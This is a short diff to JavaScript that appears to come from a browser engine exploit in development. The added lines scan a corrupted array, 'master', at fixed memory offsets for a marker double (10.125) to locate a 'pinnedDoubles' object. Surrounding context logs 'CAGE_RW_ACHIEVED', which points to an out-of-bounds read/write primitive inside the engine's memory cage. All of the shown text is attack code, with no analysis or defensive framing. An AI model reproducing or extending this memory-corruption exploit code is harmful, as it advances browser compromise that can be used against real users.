@@ -123,6 +123,13 @@ try{
         if(Math.abs(pd0-10.125)<0.001) log("PINNEDDOUBLES_FOUND");
       }
     }
+    // Binary search for pinnedDoubles (10.125) at safe intervals
+    for(const k of [0x800,0x1000,0x1800,0x2000,0x3000,0x4000,0x5000,0x6000,0x7000,0x7F00]){
+      try{
+        const v=master[k];
+        if(Math.abs(v-10.125)<0.001){log("PD_AT:"+k.toString(16)+" v="+v);break;}
+      }catch(e){log("STOP:"+k.toString(16));break;}
+    }
     log("WASM_RESULT: "+wasmInst.exports.f());
     log("CAGE_RW_ACHIEVED");
   }else if(mt==="object"){
